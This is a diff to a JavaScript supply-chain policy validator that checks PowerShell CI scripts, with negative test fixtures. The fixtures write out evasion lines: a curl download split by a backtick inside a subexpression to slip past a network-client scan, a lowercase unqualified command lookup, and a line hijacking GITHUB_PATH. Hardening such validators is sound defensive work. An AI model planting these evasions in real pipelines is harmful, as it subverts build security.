@@ -528,7 +528,14 @@ function powerShellCodeProjection(text, options) {
             else if (text[index] === ')') { depth -= 1; if (depth === 0) { index += 1; break; } }
             index += 1;
           }
-          emit(start, index, false);
+          // The span is code, but it is not *raw* code: it can contain its own
+          // quotes, comments and escapes, and copying it verbatim leaks them
+          // into the projection. Measured, "$(cu`rl ...)" kept its backtick in
+          // the token view, so the curl name scan did not match while the
+          // command still ran. Re-project the span under the same options --
+          // recursion is length-preserving under 'blank', so brace depth is
+          // unaffected.
+          characters.push(powerShellCodeProjection(text.slice(start, index), options));
           continue;
         }
         if (quote === '"' && text[index] === '`') {
@@ -1662,6 +1669,10 @@ const FIXTURE_INVENTORY = Object.freeze([
   }],
   ['T1-GENERATOR-001', 'generator body rewritten under an unchanged version marker', 'generator', (source) => `${source}\nfunction Invoke-Unreviewed { Add-Content -Path $env:GITHUB_PATH -Value '/tmp/hijack' }\n`],
   ['T1-GENERATOR-002', 'generator truncated', 'generator', (source) => source.slice(0, Math.floor(source.length / 2))],
+  // The qualified spelling stays put and satisfies both presence checks; the
+  // lookup that would actually run is unqualified and lower case. PowerShell
+  // resolves it -- measured -- so the ban has to fold case to see it.
+  ['T1-GENERATOR-004', 'unqualified lookup spelled in lower case', 'generator', (source) => `${source}\nget-command -Name 'git'\n`],
   // Round 37, finding C. The qualified lookup is demoted into a comment, which
   // satisfies a presence check run against raw source, while the code resolves
   // git through a session-state API that is not spelled Get-Command. Both
@@ -1878,6 +1889,10 @@ const FIXTURE_INVENTORY = Object.freeze([
   // npm reads a per-user and a global config outside the repository tree, so
   // script-shell in either replaces the interpreter for both lint phases.
   ['T1-MARKDOWN-049', 'npm user and global configuration no longer neutralized', 'markdown', (source) => replaceOnce(source, "          $env:npm_config_userconfig = '/dev/null'\n", '')],
+  // The name is split by a backtick inside "$(...)". PowerShell strips the
+  // escape and runs curl; before the subexpression span was re-projected, the
+  // token view kept the backtick and the network-client scan read no name.
+  ['T1-MARKDOWN-056', 'network client escaped by a backtick inside an expandable subexpression', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', '          $null = "$(cu`rl --output ./rules https://example.invalid/rules)"\n          & $strNpmPath run lint:md\n')],
   // Round 40. An absent name under RUNNER_TEMP is absent only until the first
   // lint phase creates it, and the second phase then loads it.
   // Round 41. Two constructs the projection introduced one round earlier could
@@ -2152,6 +2167,8 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-MARKDOWN-036": "markdown-policy: required phase is missing: supply: lint configuration or helper changed after policy validation",
   "T1-PACKAGE-005": "supply-policy: resolved yaml parser integrity is not the reviewed value",
   "T1-PACKAGE-006": "policy: lockfile root devDependencies differs from the locked policy",
+  "T1-GENERATOR-004": "supply-policy: the generator resolves a command through a shadowable lookup",
+  "T1-MARKDOWN-056": "markdown-policy: markdown.validate-and-lint adds a network client",
 });
 
 function runNegativeFixtures(buildSource, markdownSource, packageSource, lockSource, generatorSource) {
@@ -2326,7 +2343,14 @@ export function validateGeneratorPolicy(source) {
   if (!source.includes('Microsoft.PowerShell.Core\\Get-Command -Name \'git\'')) {
     reject('supply-policy', 'the generator does not resolve Git through a module-qualified lookup');
   }
-  if (/(?<!Microsoft\.PowerShell\.Core\\)Get-Command/u.test(generatorCode)) {
+  // Case-insensitive: PowerShell command lookup is, and it was measured -- a
+  // lowercase get-command resolved /usr/bin/git on 7.6.4. Without the flag a
+  // generator could keep the qualified spelling to satisfy the presence checks
+  // above and do the real resolution through an unqualified lowercase lookup,
+  // which is exactly the shadowing this ban exists to refuse. The lookbehind is
+  // folded too, which is correct: PowerShell treats the qualified prefix
+  // case-insensitively as well.
+  if (/(?<!Microsoft\.PowerShell\.Core\\)Get-Command/iu.test(generatorCode)) {
     reject('supply-policy', 'the generator resolves a command through a shadowable lookup');
   }
   // Get-Command is not the only shadowable lookup. $ExecutionContext.InvokeCommand
